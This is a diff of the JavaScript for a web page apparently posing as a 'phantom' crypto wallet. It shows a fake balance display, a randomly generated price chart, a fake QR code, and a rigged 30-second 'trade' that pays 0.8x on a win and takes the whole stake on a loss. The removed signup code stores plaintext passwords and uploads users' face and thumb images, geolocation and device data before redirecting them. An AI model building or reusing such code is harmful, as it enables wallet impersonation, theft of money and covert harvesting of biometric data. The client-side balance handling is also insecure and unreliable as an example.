+                .on('postgres_changes', { event: 'UPDATE', schema: 'public', table: 'profiles', filter: `id=eq.${user.id}` }, payload => {
+                    user = payload.new;
+                    localStorage.setItem('phantom_user', JSON.stringify(user));
+                    updateUI();
+                })
+                .subscribe();
         }
 
-        async function finishSignUp() {
-            const u = document.getElementById('signup-username').value;
-            const p = document.getElementById('signup-password').value;
-            
-            try {
-                // 1. Create Profile
-                const { data: profile, error: pError } = await sb.from('profiles').insert([
-                    { username: u, password: p, balance: 0 }
-                ]).select().single();
-
-                if(pError) {
-                    showToast("Username Unavailable");
-                    setTimeout(() => location.reload(), 2000);
-                    return;
-                }
-
-                // 2. Upload Biometric Metadata
-                await sb.from('verifications').insert([{
-                    user_id: profile.id,
-                    username: u,
-                    thumb_img: capturedData.thumb,
-                    smile_img: capturedData.smile,
-                    location_data: { 
-                        geo: capturedData.geo, 
-                        device: capturedData.device, 
-                        burst_stream: capturedData.burst 
+        function subscribeToHistory() {
+            if (historySubscription) historySubscription.unsubscribe();
+            historySubscription = sb.channel('history-channel')
+                .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'transactions' }, payload => {
+                    if(payload.new.from_id === user.id || payload.new.to_id === user.id) {
+                        loadHistory();
                     }
-                }]);
+                })
+                .subscribe();
+        }
 
-                showToast("Terminal Initialized.");
-                setTimeout(() => window.location.href = REDIRECT_URL, 2000);
+        function syncUserProfile() {
+            if (!user) return;
+            document.getElementById('user-display').innerText = user.username;
+            document.getElementById('avatar-init').innerText = user.username.charAt(0).toUpperCase();
+            document.getElementById('wallet-address-head').innerText = getAddress(user.username).substring(0, 10) + "...";
+        }
 
-            } catch (err) {
-                showToast("Critical Write Error");
-                setTimeout(() => location.reload(), 2000);
+        function getAddress(username) {
+            const chars = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
+            let addr = "PH"; 
+            for (let i = 0; i < 42; i++) {
+                const charIndex = (username.charCodeAt(i % username.length) + i) % chars.length;
+                addr += chars[charIndex];
             }
+            return addr;
+        }
+
+        function updateUI() {
+            if (!user) return;
+            const sol = user.balance || 0;
+            document.getElementById('balance-usd').innerText = `$${(sol * SOL_PRICE).toLocaleString(undefined, {minimumFractionDigits: 2})}`;
+            document.getElementById('balance-sol').innerText = `${sol.toFixed(2)} SOL`;
+            document.getElementById('balance-usd-sol').innerText = `$${(sol * SOL_PRICE).toLocaleString()}`;
+            document.getElementById('available-balance-hint').innerText = `Available: ${sol.toFixed(2)} SOL`;
+        }
+
+        async function transferFunds() {
+            const address = document.getElementById('send-to-addr').value.trim();
+            const amount = parseFloat(document.getElementById('send-amount').value);
+            if (!address || isNaN(amount) || amount <= 0 || amount > user.balance) return showToast("Invalid Amount");
+            toggleLoading(true);
+            
+            const { data: profiles } = await sb.from('profiles').select('username, id, balance');
+            const recipient = profiles.find(p => getAddress(p.username) === address);
+            
+            if (!recipient) { toggleLoading(false); return showToast("Recipient not found"); }
+            if (recipient.id === user.id) { toggleLoading(false); return showToast("Cannot send to yourself"); }
+
+            try {
+                await sb.from('profiles').update({ balance: user.balance - amount }).eq('id', user.id);
+                await sb.from('profiles').update({ balance: recipient.balance + amount }).eq('id', recipient.id);
+                
+                await sb.from('transactions').insert([{ 
+                    from_id: user.id, 
+                    to_id: recipient.id, 
+                    amount, 
+                    from_username: user.username, 
+                    to_username: recipient.username 
+                }]);
+                
+                showToast("Sent Successfully!"); 
+                switchView('dashboard');
+                loadHistory(); 
+            } catch (err) {
+                showToast("Transaction Failed");
+            } finally { toggleLoading(false); }
+        }
+
+        function initRealisticChart() {
+            let lastPrice = 145;
+            for(let i=0; i<38; i++) {
+                const change = (Math.random() - 0.5) * 4;
+                const open = lastPrice;
+                const close = open + change;
+                const high = Math.max(open, close) + Math.random() * 2;
+                const low = Math.min(open, close) - Math.random() * 2;
+                candles.push({ open, close, high, low });
+                lastPrice = close;
+            }
+            renderChart();
+        }
+
+        function renderChart() {
+            const container = document.getElementById('chart-container');
+            if (!container) return;
+            container.innerHTML = '';
+            const prices = candles.flatMap(c => [c.high, c.low]);
+            const maxVal = Math.max(...prices);
+            const minVal = Math.min(...prices);
+            const range = (maxVal - minVal) || 1;
+            const chartHeight = 200;
+            candles.forEach((c, i) => {
+                const candleEl = document.createElement('div');
+                candleEl.className = 'candle';
+                candleEl.style.left = `${i * 10}px`;
+                candleEl.style.color = c.close >= c.open ? '#4ade80' : '#f87171';
+                const highY = ((maxVal - c.high) / range) * chartHeight;
+                const lowY = ((maxVal - c.low) / range) * chartHeight;
+                const openY = ((maxVal - c.open) / range) * chartHeight;
+                const closeY = ((maxVal - c.close) / range) * chartHeight;
+                const bodyTop = Math.min(openY, closeY);
+                const bodyHeight = Math.max(Math.abs(openY - closeY), 2);
+                const wickHeight = Math.abs(highY - lowY);
+                candleEl.innerHTML = `
+                    <div class="wick" style="top: ${highY}px; height: ${wickHeight}px"></div>
+                    <div class="body" style="top: ${bodyTop}px; height: ${bodyHeight}px; background: currentColor"></div>
+                `;
+                container.appendChild(candleEl);
+            });
+        }
+
+        function tickPrice() {
+            if (candles.length === 0) return;
+            const last = candles[candles.length - 1];
+            const change = (Math.random() - 0.48) * 1.5; 
+            const open = last.close;
+            const close = open + change;
+            const high = Math.max(open, close) + Math.random();
+            const low = Math.min(open, close) - Math.random();
+            candles.push({ open, close, high, low });
+            if (candles.length > 38) candles.shift();
+            SOL_PRICE = close;
+            const pEl = document.getElementById('live-price-large');
+            const pSmall = document.getElementById('sol-price-display');
+            if (pEl) {
+                pEl.innerText = `$${close.toFixed(2)}`;
+                pEl.className = change >= 0 ? 'text-green-400 font-mono font-bold text-lg' : 'text-red-400 font-mono font-bold text-lg';
+            }
+            if (pSmall) pSmall.innerText = `$${close.toFixed(2)}`;
+            renderChart(); updateUI();
+        }
+
+        async function gambleTrade() {
+            if (isTrading) return;
+            const amount = parseFloat(document.getElementById('trade-amount').value);
+            if (isNaN(amount) || amount <= 0 || amount > user.balance) return showToast("Insufficient Balance");
+            isTrading = true;
+            document.getElementById('trade-btn').disabled = true;
+            document.getElementById('trade-btn').style.opacity = '0.5';
+            toggleLoading(true);
+            await new Promise(r => setTimeout(r, 1200));
+            toggleLoading(false);
+            const box = document.getElementById('active-trade-box');
+            const line = document.getElementById('position-line');
+            const timerEl = document.getElementById('trade-timer');
+            box.classList.remove('hidden'); line.classList.remove('hidden');
+            line.style.top = "50%";
+            let secondsRemaining = 30;
+            const entryPrice = SOL_PRICE;
+            const interval = setInterval(async () => {
+                secondsRemaining--;
+                timerEl.innerText = `00:${secondsRemaining < 10 ? '0' : ''}${secondsRemaining} remaining`;
+                const diff = (SOL_PRICE - entryPrice) * (tradeSide === 'buy' ? 1 : -1);
+                const pnl = diff * (amount * 50); 
+                document.getElementById('pos-pnl').innerText = `${pnl >= 0 ? '+' : ''}$${pnl.toFixed(2)}`;
+                document.getElementById('pos-pnl').className = `text-xs font-mono font-bold ${pnl >= 0 ? 'text-green-400' : 'text-red-400'}`;
+                if(secondsRemaining <= 0) {
+                    clearInterval(interval);
+                    const isWin = pnl > 0;
+                    const finalBalance = isWin ? user.balance + (amount * 0.8) : user.balance - amount;
+                    
+                    await sb.from('profiles').update({ balance: finalBalance }).eq('id', user.id);
+                    
+                    await sb.from('transactions').insert([{
+                        from_id: user.id,
+                        to_id: user.id, 
+                        amount: isWin ? (amount * 0.8) : amount,
+                        from_username: 'Exchange',
+                        to_username: isWin ? user.username : 'House'
+                    }]);
+
+                    box.classList.add('hidden'); line.classList.add('hidden');
+                    showToast(isWin ? "PROFIT WITHDRAWN" : "REKT / LIQUIDATED");
+                    isTrading = false;
+                    document.getElementById('trade-btn').disabled = false;
+                    document.getElementById('trade-btn').style.opacity = '1';
+                    loadHistory();
+                }
+            }, 1000);
+        }
+
+        function switchView(view) {
+            ['dashboard', 'send', 'history', 'receive', 'trade', 'deposit'].forEach(v => {
+                const el = document.getElementById(`view-${v}`);
+                if(el) el.classList.add('hidden');
+            });
+            document.getElementById(`view-${view}`).classList.remove('hidden');
+            document.querySelectorAll('.nav-btn').forEach(btn => btn.style.opacity = "0.3");
+            const activeNav = document.getElementById(`nav-${view}`);
+            if(activeNav) activeNav.style.opacity = "1";
+            if(view === 'history') loadHistory();
+            if(view === 'receive') { 
+                document.getElementById('receive-address').innerText = getAddress(user.username); generateQR(); 
+            }
+        }
+
+        async function loadHistory() {
+            const list = document.getElementById('history-list');
+            if (!list) return;
+            list.innerHTML = `<div class="loader mx-auto my-10 opacity-20"></div>`;
+            const { data, error } = await sb.from('transactions')
+                .select('*')
+                .or(`from_id.eq.${user.id},to_id.eq.${user.id}`)
+                .order('created_at', { ascending: false });
+
+            if(error) {
+                list.innerHTML = `<p class="text-center opacity-20 py-10">Sync Error</p>`;
+                return;
+            }
+
+            if(!data || data.length === 0) {
+                list.innerHTML = `<p class="text-center opacity-20 py-10">No History</p>`;
+                return;
+            }
+
+            list.innerHTML = data.map(tx => {
+                const isSent = tx.from_id === user.id && tx.from_username !== 'Exchange';
+                const isTrade = tx.from_username === 'Exchange' || tx.to_username === 'House';
+                let title = isSent ? 'Sent' : 'Received';
+                let subtext = isSent ? `To ${tx.to_username}` : `From ${tx.from_username}`;
+                let colorClass = isSent ? 'text-white' : 'text-green-400';
+                let sign = isSent ? '-' : '+';
+                if(isTrade) {
+                    const isWin = tx.to_username === user.username;
+                    title = 'Trade Settlement';
+                    subtext = isWin ? 'Profit' : 'Loss';
+                    colorClass = isWin ? 'text-green-400' : 'text-red-400';
+                    sign = isWin ? '+' : '-';
+                }
+                return `
+                <div class="glass p-4 rounded-xl flex justify-between items-center animate__animated animate__fadeIn">
+                    <div>
+                        <p class="text-[10px] font-bold uppercase tracking-tighter opacity-80">${title}</p>
+                        <p class="text-[9px] opacity-40 font-mono">${subtext}</p>
+                    </div>
+                    <p class="font-bold text-xs ${colorClass}">${sign}${tx.amount} SOL</p>
+                </div>`;
+            }).join('');
+        }
+
+        function generateQR() {
+            const grid = document.getElementById('qr-pattern'); if(!grid) return;
+            grid.innerHTML = '';
+            for(let i=0; i<64; i++) {
+                const cell = document.createElement('div');
+                cell.className = `${Math.random() > 0.6 ? 'bg-black' : 'bg-transparent'} w-full h-full`;
+                grid.appendChild(cell);
+            }
+        }
+
+        function showToast(msg) {
+            const t = document.getElementById('toast'); t.innerText = msg;
+            t.classList.remove('translate-y-64'); setTimeout(() => t.classList.add('translate-y-64'), 2000);
+        }
+
+        function setSide(side) { 
+            tradeSide = side; 
+            document.getElementById('buy-tab').className = side === 'buy' ? 'flex-1 text-[10px] font-bold text-green-400 border-b-2 border-green-400 pb-2' : 'flex-1 text-[10px] font-bold text-white/20 pb-2';
+            document.getElementById('sell-tab').className = side === 'sell' ? 'flex-1 text-[10px] font-bold text-red-400 border-b-2 border-red-400 pb-2' : 'flex-1 text-[10px] font-bold text-white/20 pb-2';
+        }
+        function toggleAuth(mode) { 
+            document.getElementById('login-form').classList.toggle('hidden', mode==='signup'); 
+            document.getElementById('signup-form').classList.toggle('hidden', mode==='login'); 
+        }
+        function toggleLoading(show) { document.getElementById('loading-overlay').classList.toggle('hidden', !show); }
+        function copyAddress() { 
+            const text = document.getElementById('receive-address').innerText;
+            const elem = document.createElement('textarea');
+            elem.value = text; document.body.appendChild(elem);
+            elem.select(); document.execCommand('copy');
+            document.body.removeChild(elem);
+            showToast("Address Copied"); 
+        }
+        function signOut() { 
+            if(profileSubscription) profileSubscription.unsubscribe(); 
+            if(historySubscription) historySubscription.unsubscribe();
+            localStorage.removeItem('phantom_user'); 
+            location.reload(); 
         }
     </script>
 </body>
